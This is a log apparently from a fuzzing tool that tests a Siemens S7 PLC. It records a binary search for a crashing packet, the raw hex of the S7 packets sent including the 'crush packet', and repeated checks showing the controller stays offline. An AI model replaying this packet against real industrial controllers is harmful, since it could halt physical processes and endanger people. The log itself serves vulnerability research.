[2021-11-13 19:48:03,669] [INFO] [BLocate.locate] -> Start binary search crush
[2021-11-13 19:48:03,669] [INFO] [BLocate.locate] -> chosenPacket from 0 to 5 ; leftPackets from 5 to 10.
[2021-11-13 19:48:03,770] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-11-13 19:48:03,771] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-11-13 19:48:03,774] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-11-13 19:48:03,778] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-11-13 19:48:04,149] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-13 19:48:04,151] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100000400000e00000401120a10010003000083000001
[2021-11-13 19:48:04,153] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-11-13 19:48:04,155] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-11-13 19:48:07,161] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-13 19:48:13,205] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-13 19:48:13,205] [INFO] [BLocate.locate] -> find a crush
[2021-11-13 19:48:13,206] [INFO] [valition.handleCrush] -> handling crush
[2021-11-13 19:48:13,206] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-13 19:48:13,520] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-13 19:48:15,524] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-13 19:48:15,771] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-13 19:48:19,787] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-13 19:48:25,821] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-13 19:48:29,837] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-13 19:48:35,859] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-13 19:48:39,869] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-13 19:48:45,899] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-13 19:48:49,913] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-13 19:48:55,952] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
